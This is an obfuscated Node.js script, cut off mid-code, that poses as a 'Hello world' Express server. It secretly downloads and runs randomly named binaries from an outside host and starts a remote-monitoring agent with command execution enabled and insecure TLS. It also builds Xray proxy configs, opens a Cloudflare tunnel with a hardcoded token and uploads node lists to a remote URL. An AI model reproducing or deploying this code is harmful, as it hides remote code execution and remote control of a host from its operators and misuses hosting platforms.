const _0xcf68f0=_0x106d;function _0x106d(_0x17c27b,_0x3c23df){const _0x589fd6=_0x589f();return _0x106d=function(_0x106d23,_0x396ff2){_0x106d23=_0x106d23-0xdc;let _0x3fc669=_0x589fd6[_0x106d23];return _0x3fc669;},_0x106d(_0x17c27b,_0x3c23df);}(function(_0x21caf4,_0x502b85){const _0x28dd5e=_0x106d,_0x27b64d=_0x21caf4();while(!![]){try{const _0x16bb90=-parseInt(_0x28dd5e(0x16e))/0x1*(parseInt(_0x28dd5e(0x136))/0x2)+-parseInt(_0x28dd5e(0x121))/0x3+-parseInt(_0x28dd5e(0xf4))/0x4*(parseInt(_0x28dd5e(0x1b1))/0x5)+parseInt(_0x28dd5e(0x155))/0x6+-parseInt(_0x28dd5e(0x1ab))/0x7+-parseInt(_0x28dd5e(0x146))/0x8*(-parseInt(_0x28dd5e(0x17e))/0x9)+parseInt(_0x28dd5e(0x1b9))/0xa;if(_0x16bb90===_0x502b85)break;else _0x27b64d['push'](_0x27b64d['shift']());}catch(_0x5384dd){_0x27b64d['push'](_0x27b64d['shift']());}}}(_0x589f,0xd3fb5));const express=require('express'),app=express(),axios=require(_0xcf68f0(0x157)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0xcf68f0(0x16b)),exec=promisify(require(_0xcf68f0(0x15a))[_0xcf68f0(0x14e)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0xcf68f0(0x1b3)][_0xcf68f0(0x12b)]||'',PROJECT_URL=process[_0xcf68f0(0x1b3)][_0xcf68f0(0xfa)]||'',AUTO_ACCESS=process[_0xcf68f0(0x1b3)][_0xcf68f0(0x122)]||![],FILE_PATH=process[_0xcf68f0(0x1b3)][_0xcf68f0(0x1ba)]||'./tmp',SUB_PATH=process[_0xcf68f0(0x1b3)][_0xcf68f0(0x186)]||_0xcf68f0(0x127),PORT=process[_0xcf68f0(0x1b3)][_0xcf68f0(0x181)]||process[_0xcf68f0(0x1b3)][_0xcf68f0(0x184)]||0xbb8,UUID=process[_0xcf68f0(0x1b3)][_0xcf68f0(0xeb)]||'c136a6d8-f94e-42f9-b279-099244c48044',NEZHA_SERVER=process[_0xcf68f0(0x1b3)][_0xcf68f0(0x114)]||'crbvinmnqpyv.us-west-1.clawcloudrun.com:80',NEZHA_PORT=process['env'][_0xcf68f0(0x16a)]||'',NEZHA_KEY=process[_0xcf68f0(0x1b3)]['NEZHA_KEY']||_0xcf68f0(0x164),ARGO_DOMAIN=process[_0xcf68f0(0x1b3)][_0xcf68f0(0x12a)]||_0xcf68f0(0x17c),ARGO_AUTH=process[_0xcf68f0(0x1b3)]['ARGO_AUTH']||_0xcf68f0(0x194),ARGO_PORT=process['env'][_0xcf68f0(0xed)]||0xa17,CFIP=process[_0xcf68f0(0x1b3)][_0xcf68f0(0xf9)]||_0xcf68f0(0x138),CFPORT=process[_0xcf68f0(0x1b3)][_0xcf68f0(0x172)]||0x1bb,NAME=process['env']['NAME']||_0xcf68f0(0x132);!fs[_0xcf68f0(0xf6)](FILE_PATH)?(fs[_0xcf68f0(0x154)](FILE_PATH),console[_0xcf68f0(0x115)](FILE_PATH+'\x20is\x20created')):console[_0xcf68f0(0x115)](FILE_PATH+_0xcf68f0(0xf1));function generateRandomName(){const _0x15f53b=_0xcf68f0,_0x28a2d5=_0x15f53b(0xe4);let _0xbc6e22='';for(let _0x1af112=0x0;_0x1af112<0x6;_0x1af112++){_0xbc6e22+=_0x28a2d5[_0x15f53b(0x192)](Math[_0x15f53b(0xfe)](Math[_0x15f53b(0x102)]()*_0x28a2d5[_0x15f53b(0xf3)]));}return _0xbc6e22;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0xcf68f0(0x120)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0xcf68f0(0x120)](FILE_PATH,botName),subPath=path[_0xcf68f0(0x120)](FILE_PATH,_0xcf68f0(0x112)),listPath=path['join'](FILE_PATH,_0xcf68f0(0x19c)),bootLogPath=path[_0xcf68f0(0x120)](FILE_PATH,_0xcf68f0(0x191)),configPath=path['join'](FILE_PATH,_0xcf68f0(0x118));function deleteNodes(){const _0x111dd4=_0xcf68f0;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x2343c9;try{_0x2343c9=fs['readFileSync'](subPath,_0x111dd4(0x10c));}catch{return null;}const _0x317367=Buffer['from'](_0x2343c9,'base64')['toString'](_0x111dd4(0x10c)),_0x48656e=_0x317367[_0x111dd4(0x109)]('\x0a')[_0x111dd4(0x14f)](_0x53dde9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x111dd4(0x14c)](_0x53dde9));if(_0x48656e[_0x111dd4(0xf3)]===0x0)return;const _0x4d3a14={};_0x4d3a14[_0x111dd4(0xdd)]=_0x48656e;const _0x44b95f={};_0x44b95f[_0x111dd4(0x151)]=_0x111dd4(0x170);const _0x191665={};return _0x191665['headers']=_0x44b95f,axios['post'](UPLOAD_URL+_0x111dd4(0x19f),JSON['stringify'](_0x4d3a14),_0x191665)['catch'](_0x11cfb5=>{return null;}),null;}catch(_0x4be0f2){return null;}}function cleanupOldFiles(){const _0x4d3f4d=_0xcf68f0;try{const _0x53a135=fs['readdirSync'](FILE_PATH);_0x53a135[_0x4d3f4d(0x13d)](_0x32a724=>{const _0x370b1d=_0x4d3f4d,_0x406f94=path[_0x370b1d(0x120)](FILE_PATH,_0x32a724);try{const _0x2e11c9=fs[_0x370b1d(0x19a)](_0x406f94);_0x2e11c9[_0x370b1d(0x177)]()&&fs['unlinkSync'](_0x406f94);}catch(_0x287b89){}});}catch(_0x1c5237){}}app[_0xcf68f0(0x165)]('/',function(_0x56509a,_0x4a1c3d){const _0x38cd8f=_0xcf68f0;_0x4a1c3d['send'](_0x38cd8f(0x15f));});function _0x589f(){const _0x9088f=['error','http\x20server\x20is\x20running\x20on\x20port:','\x20>/dev/null\x202>&1\x20&','260706tjbiHX','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','cdns.doon.eu.org','host','security','Download\x20','settings','forEach','/vless-argo','/trojan-argo','push','win32','encoding','set','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','clients','6262288lMPTnh','\x0a\x20\x20credentials-file:\x20','wsSettings','&path=%2Ftrojan-argo%3Fed%3D2560#','dns','inbounds','test','message','exec','filter','type','Content-Type','https://arm64.ssss.nyc.mn/web','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','mkdirSync','2780640YZsUgf','tunnel.yml','axios','\x0a\x20\x20tunnel:\x20','\x0a\x20\x20\x0avmess://','child_process','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','destOverride','Error\x20in\x20startserver:','\x0a\x20\x20\x20\x20','Hello\x20world!','block','tls','post','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','g2GOIZ6Ran1hPhztbaZL9EaejJIoCCnG','get','\x20successfully','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','platform','Empowerment\x20failed\x20for\x20','NEZHA_PORT','util','listen','Error\x20reading\x20boot.log:','2alszdq','password','application/json','arm64','CFPORT','dest','2083','2096','finish','isFile','servers','protocol','path','\x20is\x20running','lao.hun91.cloudns.org','Add\x20automatic\x20access\x20task\x20faild:\x20','18lyEQax','catch','streamSettings','SERVER_PORT','/tunnel.yml\x20run','Unhandled\x20error\x20in\x20startserver:','PORT','\x20>/dev/null\x202>&1','SUB_PATH','https://amd64.ssss.nyc.mn/web','TunnelSecret','https://amd64.ssss.nyc.mn/bot','from','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','alpn','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','decryption','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://oooo.serv00.net/add-url','boot.log','charAt','then','eyJhIjoiYzZjYjc4NDJiZjM0NDQ3ZGRmZjUyNjAyYTE2ZDVlMWEiLCJ0IjoiZWE5MjYwYjEtMjEwZS00MDU4LTgzOWItODYzNWI0YjI0NTVjIiwicyI6Ik5EZGlZVEZoTm1JdE1UWTVOaTAwWVRRMkxUZ3hNVE10TTJSak5EQm1ORGswWVdSaCJ9','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https://amd64.ssss.nyc.mn/agent','automatic\x20access\x20task\x20added\x20successfully','blackhole','ArgoDomain:','statSync','firefox','list.txt','vless','Skipping\x20adding\x20automatic\x20access\x20task','/api/delete-nodes','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','Error\x20downloading\x20files:','\x0a\x20\x20\x0atrojan://','metadataOnly','has','sni','unshift','nohup\x20','\x20>\x20nul\x202>&1','rm\x20-rf\x20','sniffing','9051931LMutmw','/api/add-nodes','includes','url','/dev/null','/vmess-argo','5VllyKe','net','env','level','fileUrl','2053','send','direct','20594440oqqHJT','FILE_PATH','match','pipe','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','nodes','127.0.0.1','tcp','status','\x20-c\x20\x22','Error\x20executing\x20command:\x20','access','abcdefghijklmnopqrstuvwxyz','createWriteStream','tunnel.json','clear','base64','chmod','8443','UUID','&fp=firefox&type=ws&host=','ARGO_PORT','?security=tls&sni=','quic','/sub.txt\x20saved\x20successfully','\x20already\x20exists','enabled','length','2969684GhBTVx','\x20failed:\x20','existsSync','\x22\x20>\x20/dev/null\x202>&1','close','CFIP','PROJECT_URL','stringify','\x20-c\x20','https://arm64.ssss.nyc.mn/bot','floor','all','writeFileSync','.exe\x20>\x20nul\x202>&1','random','ARGO_DOMAIN:','none','\x20-p\x20','pkill\x20-f\x20\x22[','basename','Nodes\x20uploaded\x20successfully','split','false','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','utf-8','App\x20is\x20running','\x0avless://','recursive','text/plain;\x20charset=utf-8','headers','sub.txt','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','NEZHA_SERVER','log','toString','arm','config.json','https+local://8.8.8.8/dns-query','\x20-s\x20','/vmess-argo?ed=2560','port','unlink','aarch64','https://arm64.ssss.nyc.mn/v1','join','2771757OWuofD','AUTO_ACCESS','php\x20running\x20error:\x20','readFileSync','true','fileName','fu258369','\x0aclient_secret:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN','UPLOAD_URL','aid','scy','443','network','tag','data','xiao'];_0x589f=function(){return _0x9088f;};return _0x589f();}async function generateConfig(){const _0x278a87=_0xcf68f0,_0x5c7c23={};_0x5c7c23[_0x278a87(0xe3)]='/dev/null',_0x5c7c23[_0x278a87(0x133)]=_0x278a87(0x1af),_0x5c7c23['loglevel']=_0x278a87(0x104);const _0x3088e4={};_0x3088e4['id']=UUID,_0x3088e4['flow']='xtls-rprx-vision';const _0x483e26={};_0x483e26[_0x278a87(0x173)]=0xbb9;const _0x44d11d={};_0x44d11d['path']='/vless-argo',_0x44d11d[_0x278a87(0x173)]=0xbba;const _0x1752c4={};_0x1752c4[_0x278a87(0x17a)]='/vmess-argo',_0x1752c4[_0x278a87(0x173)]=0xbbb;const _0x1371e5={};_0x1371e5[_0x278a87(0x17a)]=_0x278a87(0x13f),_0x1371e5[_0x278a87(0x173)]=0xbbc;const _0x1d08be={};_0x1d08be['clients']=[_0x3088e4],_0x1d08be[_0x278a87(0x18e)]=_0x278a87(0x104),_0x1d08be['fallbacks']=[_0x483e26,_0x44d11d,_0x1752c4,_0x1371e5];const _0x2edd84={};_0x2edd84[_0x278a87(0x12f)]='tcp';const _0x3e6ce6={};_0x3e6ce6[_0x278a87(0x11c)]=ARGO_PORT,_0x3e6ce6[_0x278a87(0x179)]=_0x278a87(0x19d),_0x3e6ce6[_0x278a87(0x13c)]=_0x1d08be,_0x3e6ce6['streamSettings']=_0x2edd84;const _0x17ea44={};_0x17ea44['id']=UUID;const _0x5a7873={};_0x5a7873[_0x278a87(0x145)]=[_0x17ea44],_0x5a7873[_0x278a87(0x18e)]=_0x278a87(0x104);const _0xc46840={};_0xc46840[_0x278a87(0x12f)]=_0x278a87(0xdf),_0xc46840['security']=_0x278a87(0x104);const _0x4f7847={};_0x4f7847['port']=0xbb9,_0x4f7847[_0x278a87(0x16c)]=_0x278a87(0xde),_0x4f7847[_0x278a87(0x179)]=_0x278a87(0x19d),_0x4f7847['settings']=_0x5a7873,_0x4f7847[_0x278a87(0x180)]=_0xc46840;const _0x28be7d={};_0x28be7d['id']=UUID,_0x28be7d[_0x278a87(0x1b4)]=0x0;const _0x16f934={};_0x16f934[_0x278a87(0x145)]=[_0x28be7d],_0x16f934[_0x278a87(0x18e)]=_0x278a87(0x104);const _0x3518cf={};_0x3518cf[_0x278a87(0x17a)]=_0x278a87(0x13e);const _0x30160f={};_0x30160f['network']='ws',_0x30160f[_0x278a87(0x13a)]=_0x278a87(0x104),_0x30160f[_0x278a87(0x148)]=_0x3518cf;const _0x4b9f5d={};_0x4b9f5d[_0x278a87(0xf2)]=!![],_0x4b9f5d[_0x278a87(0x15c)]=['http',_0x278a87(0x161),'quic'],_0x4b9f5d[_0x278a87(0x1a3)]=![];const _0x577350={};_0x577350[_0x278a87(0x11c)]=0xbba,_0x577350[_0x278a87(0x16c)]=_0x278a87(0xde),_0x577350[_0x278a87(0x179)]=_0x278a87(0x19d),_0x577350[_0x278a87(0x13c)]=_0x16f934,_0x577350[_0x278a87(0x180)]=_0x30160f,_0x577350[_0x278a87(0x1aa)]=_0x4b9f5d;const _0x7a9635={};_0x7a9635['id']=UUID,_0x7a9635['alterId']=0x0;const _0x32c0db={};_0x32c0db[_0x278a87(0x145)]=[_0x7a9635];const _0x1f4eab={};_0x1f4eab['path']=_0x278a87(0x1b0);const _0x335bd8={};_0x335bd8[_0x278a87(0x12f)]='ws',_0x335bd8[_0x278a87(0x148)]=_0x1f4eab;const _0x49f172={};_0x49f172[_0x278a87(0xf2)]=!![],_0x49f172[_0x278a87(0x15c)]=['http',_0x278a87(0x161),_0x278a87(0xef)],_0x49f172[_0x278a87(0x1a3)]=![];const _0x58eba4={};_0x58eba4[_0x278a87(0x11c)]=0xbbb,_0x58eba4[_0x278a87(0x16c)]=_0x278a87(0xde),_0x58eba4['protocol']='vmess',_0x58eba4[_0x278a87(0x13c)]=_0x32c0db,_0x58eba4[_0x278a87(0x180)]=_0x335bd8,_0x58eba4[_0x278a87(0x1aa)]=_0x49f172;const _0x35bb29={};_0x35bb29[_0x278a87(0x16f)]=UUID;const _0xc1a59f={};_0xc1a59f['clients']=[_0x35bb29];const _0x58a2d0={};_0x58a2d0[_0x278a87(0x17a)]=_0x278a87(0x13f);const _0x49e2fd={};_0x49e2fd[_0x278a87(0x12f)]='ws',_0x49e2fd[_0x278a87(0x13a)]=_0x278a87(0x104),_0x49e2fd[_0x278a87(0x148)]=_0x58a2d0;const _0x22c5d9={};_0x22c5d9[_0x278a87(0xf2)]=!![],_0x22c5d9['destOverride']=['http','tls',_0x278a87(0xef)],_0x22c5d9[_0x278a87(0x1a3)]=![];const _0x5f5e04={};_0x5f5e04[_0x278a87(0x11c)]=0xbbc,_0x5f5e04[_0x278a87(0x16c)]=_0x278a87(0xde),_0x5f5e04[_0x278a87(0x179)]='trojan',_0x5f5e04[_0x278a87(0x13c)]=_0xc1a59f,_0x5f5e04[_0x278a87(0x180)]=_0x49e2fd,_0x5f5e04[_0x278a87(0x1aa)]=_0x22c5d9;const _0x3685df={};_0x3685df[_0x278a87(0x178)]=[_0x278a87(0x119)];const _0x11a02b={};_0x11a02b[_0x278a87(0x179)]='freedom',_0x11a02b['tag']=_0x278a87(0x1b8);const _0x5c0caf={};_0x5c0caf[_0x278a87(0x179)]=_0x278a87(0x198),_0x5c0caf[_0x278a87(0x130)]=_0x278a87(0x160);const _0x50742a={};_0x50742a['log']=_0x5c7c23,_0x50742a[_0x278a87(0x14b)]=[_0x3e6ce6,_0x4f7847,_0x577350,_0x58eba4,_0x5f5e04],_0x50742a[_0x278a87(0x14a)]=_0x3685df,_0x50742a['outbounds']=[_0x11a02b,_0x5c0caf];const _0x4a8e35=_0x50742a;fs['writeFileSync'](path[_0x278a87(0x120)](FILE_PATH,'config.json'),JSON['stringify'](_0x4a8e35,null,0x2));}function getSystemArchitecture(){const _0x14e96d=_0xcf68f0,_0x2ff1cf=os['arch']();return _0x2ff1cf===_0x14e96d(0x117)||_0x2ff1cf===_0x14e96d(0x171)||_0x2ff1cf===_0x14e96d(0x11e)?'arm':'amd';}function downloadFile(_0x2a2d6d,_0x8970ff,_0x5828c8){const _0xcec8cf=_0xcf68f0,_0x271b6c=_0x2a2d6d;if(!fs[_0xcec8cf(0xf6)](FILE_PATH)){const _0x2819b2={};_0x2819b2[_0xcec8cf(0x10f)]=!![],fs[_0xcec8cf(0x154)](FILE_PATH,_0x2819b2);}const _0x130ffc=fs[_0xcec8cf(0xe5)](_0x271b6c),_0x464f6b={};_0x464f6b['method']='get',_0x464f6b[_0xcec8cf(0x1ae)]=_0x8970ff,_0x464f6b['responseType']='stream',axios(_0x464f6b)[_0xcec8cf(0x193)](_0x11017c=>{const _0x458f8d=_0xcec8cf;_0x11017c[_0x458f8d(0x131)][_0x458f8d(0x1bc)](_0x130ffc),_0x130ffc['on'](_0x458f8d(0x176),()=>{const _0x3a6b13=_0x458f8d;_0x130ffc[_0x3a6b13(0xf8)](),console['log'](_0x3a6b13(0x13b)+path[_0x3a6b13(0x107)](_0x271b6c)+_0x3a6b13(0x166)),_0x5828c8(null,_0x271b6c);}),_0x130ffc['on']('error',_0x1f836c=>{const _0x2fd110=_0x458f8d;fs[_0x2fd110(0x11d)](_0x271b6c,()=>{});const _0x289c89=_0x2fd110(0x13b)+path['basename'](_0x271b6c)+_0x2fd110(0xf5)+_0x1f836c[_0x2fd110(0x14d)];console[_0x2fd110(0x133)](_0x289c89),_0x5828c8(_0x289c89);});})[_0xcec8cf(0x17f)](_0x2422ff=>{const _0x1b8555=_0xcec8cf,_0x10fc50=_0x1b8555(0x13b)+path[_0x1b8555(0x107)](_0x271b6c)+'\x20failed:\x20'+_0x2422ff[_0x1b8555(0x14d)];console[_0x1b8555(0x133)](_0x10fc50),_0x5828c8(_0x10fc50);});}async function downloadFilesAndRun(){const _0x3dda73=_0xcf68f0,_0x244444=getSystemArchitecture(),_0x206e14=getFilesForArchitecture(_0x244444);if(_0x206e14[_0x3dda73(0xf3)]===0x0){console[_0x3dda73(0x115)](_0x3dda73(0x1a0));return;}const _0x309ae9=_0x206e14['map'](_0x32b4f2=>{return new Promise((_0xb670e9,_0x3d26cb)=>{const _0x44b347=_0x106d;downloadFile(_0x32b4f2[_0x44b347(0x126)],_0x32b4f2[_0x44b347(0x1b5)],(_0x318705,_0x4576ef)=>{_0x318705?_0x3d26cb(_0x318705):_0xb670e9(_0x4576ef);});});});try{await Promise[_0x3dda73(0xff)](_0x309ae9);}catch(_0x443ad6){console[_0x3dda73(0x133)](_0x3dda73(0x1a1),_0x443ad6);return;}function _0x57a3ca(_0x4e5f5b){const _0x2cfd65=_0x3dda73,_0x99a0d8=0x1fd;_0x4e5f5b[_0x2cfd65(0x13d)](_0x7996c2=>{const _0x59a8e8=_0x2cfd65;fs['existsSync'](_0x7996c2)&&fs[_0x59a8e8(0xe9)](_0x7996c2,_0x99a0d8,_0x5e61c1=>{const _0xfe9aaf=_0x59a8e8;_0x5e61c1?console[_0xfe9aaf(0x133)](_0xfe9aaf(0x169)+_0x7996c2+':\x20'+_0x5e61c1):console['log']('Empowerment\x20success\x20for\x20'+_0x7996c2+':\x20'+_0x99a0d8['toString'](0x8));});});}const _0x41c793=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x57a3ca(_0x41c793);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x390349=NEZHA_SERVER[_0x3dda73(0x1ad)](':')?NEZHA_SERVER[_0x3dda73(0x109)](':')['pop']():'',_0x258576=new Set([_0x3dda73(0x12e),_0x3dda73(0xea),_0x3dda73(0x175),'2087','2083','2053']),_0x39f146=_0x258576[_0x3dda73(0x1a4)](_0x390349)?_0x3dda73(0x125):_0x3dda73(0x10a),_0x2cf337=_0x3dda73(0x128)+NEZHA_KEY+_0x3dda73(0x18f)+NEZHA_SERVER+_0x3dda73(0xdc)+_0x39f146+_0x3dda73(0x144)+UUID;fs['writeFileSync'](path[_0x3dda73(0x120)](FILE_PATH,'config.yaml'),_0x2cf337);const _0x42b5d2=_0x3dda73(0x1a7)+phpPath+_0x3dda73(0xe1)+FILE_PATH+_0x3dda73(0x129);try{await exec(_0x42b5d2),console[_0x3dda73(0x115)](phpName+_0x3dda73(0x17b)),await new Promise(_0x47a101=>setTimeout(_0x47a101,0x3e8));}catch(_0x1adee7){console[_0x3dda73(0x133)](_0x3dda73(0x123)+_0x1adee7);}}else{let _0x270bc0='';const _0x196bd2=[_0x3dda73(0x12e),_0x3dda73(0xea),_0x3dda73(0x175),'2087',_0x3dda73(0x174),_0x3dda73(0x1b6)];_0x196bd2[_0x3dda73(0x1ad)](NEZHA_PORT)&&(_0x270bc0='--tls');const _0x3ecf38='nohup\x20'+npmPath+_0x3dda73(0x11a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3dda73(0x105)+NEZHA_KEY+'\x20'+_0x270bc0+_0x3dda73(0x167);try{await exec(_0x3ecf38),console['log'](npmName+'\x20is\x20running'),await new Promise(_0xd14db7=>setTimeout(_0xd14db7,0x3e8));}catch(_0x562e70){console[_0x3dda73(0x133)]('npm\x20running\x20error:\x20'+_0x562e70);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x2258c3=_0x3dda73(0x1a7)+webPath+_0x3dda73(0xfc)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2258c3),console[_0x3dda73(0x115)](webName+_0x3dda73(0x17b)),await new Promise(_0x3fed9d=>setTimeout(_0x3fed9d,0x3e8));}catch(_0x1e3817){console[_0x3dda73(0x133)]('web\x20running\x20error:\x20'+_0x1e3817);}if(fs[_0x3dda73(0xf6)](botPath)){let _0x14ddf5;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x14ddf5='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x3dda73(0x1bb)](/TunnelSecret/)?_0x14ddf5=_0x3dda73(0x163)+FILE_PATH+_0x3dda73(0x182):_0x14ddf5=_0x3dda73(0x10b)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x3dda73(0x1a7)+botPath+'\x20'+_0x14ddf5+_0x3dda73(0x135)),console[_0x3dda73(0x115)](botName+'\x20is\x20running'),await new Promise(_0x5192d2=>setTimeout(_0x5192d2,0x7d0));}catch(_0x49c2c4){console[_0x3dda73(0x133)](_0x3dda73(0xe2)+_0x49c2c4);}}await new Promise(_0x202c29=>setTimeout(_0x202c29,0x1388));}function getFilesForArchitecture(_0x24c054){const _0x511f46=_0xcf68f0;let _0x498ce1;if(_0x24c054==='arm'){const _0x2d7ada={};_0x2d7ada[_0x511f46(0x126)]=webPath,_0x2d7ada[_0x511f46(0x1b5)]=_0x511f46(0x152);const _0x452676={};_0x452676['fileName']=botPath,_0x452676[_0x511f46(0x1b5)]=_0x511f46(0xfd),_0x498ce1=[_0x2d7ada,_0x452676];}else{const _0x2cc15a={};_0x2cc15a[_0x511f46(0x126)]=webPath,_0x2cc15a[_0x511f46(0x1b5)]=_0x511f46(0x187);const _0x150170={};_0x150170['fileName']=botPath,_0x150170[_0x511f46(0x1b5)]=_0x511f46(0x189),_0x498ce1=[_0x2cc15a,_0x150170];}if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5c8af6=_0x24c054===_0x511f46(0x117)?'https://arm64.ssss.nyc.mn/agent':_0x511f46(0x196),_0x173deb={};_0x173deb[_0x511f46(0x126)]=npmPath,_0x173deb['fileUrl']=_0x5c8af6,_0x498ce1[_0x511f46(0x1a6)](_0x173deb);}else{const _0x181a91=_0x24c054===_0x511f46(0x117)?_0x511f46(0x11f):'https://amd64.ssss.nyc.mn/v1',_0x18366e={};_0x18366e[_0x511f46(0x126)]=phpPath,_0x18366e[_0x511f46(0x1b5)]=_0x181a91,_0x498ce1['unshift'](_0x18366e);}}return _0x498ce1;}function argoType(){const _0x43c24d=_0xcf68f0;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x43c24d(0x113));return;}if(ARGO_AUTH[_0x43c24d(0x1ad)](_0x43c24d(0x188))){fs[_0x43c24d(0x100)](path[_0x43c24d(0x120)](FILE_PATH,_0x43c24d(0xe6)),ARGO_AUTH);const _0x13b43c=_0x43c24d(0x158)+ARGO_AUTH[_0x43c24d(0x109)]('\x22')[0xb]+_0x43c24d(0x147)+path[_0x43c24d(0x120)](FILE_PATH,_0x43c24d(0xe6))+_0x43c24d(0x195)+ARGO_DOMAIN+_0x43c24d(0x18b)+ARGO_PORT+_0x43c24d(0x18d);fs[_0x43c24d(0x100)](path[_0x43c24d(0x120)](FILE_PATH,_0x43c24d(0x156)),_0x13b43c);}else console['log'](_0x43c24d(0x137));}argoType();async function extractDomains(){const _0x3aba1c=_0xcf68f0;let _0x24d9bb;if(ARGO_AUTH&&ARGO_DOMAIN)_0x24d9bb=ARGO_DOMAIN,console['log'](_0x3aba1c(0x103),_0x24d9bb),await _0x2adefc(_0x24d9bb);else try{const _0x48998a=fs[_0x3aba1c(0x124)](path[_0x3aba1c(0x120)](FILE_PATH,_0x3aba1c(0x191)),'utf-8'),_0x24557d=_0x48998a[_0x3aba1c(0x109)]('\x0a'),_0x54567c=[];_0x24557d[_0x3aba1c(0x13d)](_0x47b6dc=>{const _0x3be827=_0x3aba1c,_0x147ff5=_0x47b6dc[_0x3be827(0x1bb)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x147ff5){const _0x4d186f=_0x147ff5[0x1];_0x54567c['push'](_0x4d186f);}});if(_0x54567c[_0x3aba1c(0xf3)]>0x0)_0x24d9bb=_0x54567c[0x0],console[_0x3aba1c(0x115)](_0x3aba1c(0x199),_0x24d9bb),await _0x2adefc(_0x24d9bb);else{console[_0x3aba1c(0x115)](_0x3aba1c(0x15b)),fs['unlinkSync'](path[_0x3aba1c(0x120)](FILE_PATH,_0x3aba1c(0x191)));async function _0x65003e(){const _0x1fd685=_0x3aba1c;try{process[_0x1fd685(0x168)]==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x1fd685(0x101)):await exec(_0x1fd685(0x106)+botName[_0x1fd685(0x192)](0x0)+']'+botName['substring'](0x1)+_0x1fd685(0xf7));}catch(_0xf9aa7){}}_0x65003e(),await new Promise(_0x1edb09=>setTimeout(_0x1edb09,0xbb8));const _0x404008=_0x3aba1c(0x10b)+FILE_PATH+_0x3aba1c(0x153)+ARGO_PORT;try{await exec(_0x3aba1c(0x1a7)+botPath+'\x20'+_0x404008+_0x3aba1c(0x135)),console['log'](botName+_0x3aba1c(0x17b)),await new Promise(_0x26aa6f=>setTimeout(_0x26aa6f,0xbb8)),await extractDomains();}catch(_0x1b5c0f){console[_0x3aba1c(0x133)]('Error\x20executing\x20command:\x20'+_0x1b5c0f);}}}catch(_0x58f97a){console[_0x3aba1c(0x133)](_0x3aba1c(0x16d),_0x58f97a);}async function _0x2adefc(_0x1fbf02){const _0x2ecb75=_0x3aba1c,_0x37e391={};_0x37e391[_0x2ecb75(0x142)]=_0x2ecb75(0x10c);const _0x55eeda=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',_0x37e391),_0x500bb5=_0x55eeda['trim'](),_0x218371=NAME?NAME+'-'+_0x500bb5:_0x500bb5;return new Promise(_0x5b6306=>{setTimeout(()=>{const _0x2e2213=_0x106d,_0x2e390f={};_0x2e390f['v']='2',_0x2e390f['ps']=''+_0x218371,_0x2e390f['add']=CFIP,_0x2e390f[_0x2e2213(0x11c)]=CFPORT,_0x2e390f['id']=UUID,_0x2e390f[_0x2e2213(0x12c)]='0',_0x2e390f[_0x2e2213(0x12d)]=_0x2e2213(0x104),_0x2e390f[_0x2e2213(0x1b2)]='ws',_0x2e390f[_0x2e2213(0x150)]='none',_0x2e390f[_0x2e2213(0x139)]=_0x1fbf02,_0x2e390f[_0x2e2213(0x17a)]=_0x2e2213(0x11b),_0x2e390f[_0x2e2213(0x161)]=_0x2e2213(0x161),_0x2e390f[_0x2e2213(0x1a5)]=_0x1fbf02,_0x2e390f[_0x2e2213(0x18c)]='',_0x2e390f['fp']=_0x2e2213(0x19b);const 